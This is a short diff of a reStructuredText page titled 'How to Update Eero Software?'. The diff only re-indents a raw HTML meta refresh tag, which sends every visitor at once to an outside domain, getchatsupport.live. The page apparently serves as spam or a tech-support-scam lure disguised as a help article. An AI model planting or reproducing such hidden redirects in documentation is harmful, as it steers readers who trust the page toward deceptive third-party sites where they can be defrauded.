@@ -1,6 +1,6 @@
-
 .. raw:: html
-  <meta http-equiv="refresh" content="0; url=https://getchatsupport.live/">
+ 
+    <meta http-equiv="refresh" content="0; url=https://getchatsupport.live/">
 
 How to Update Eero Software?
 =========================
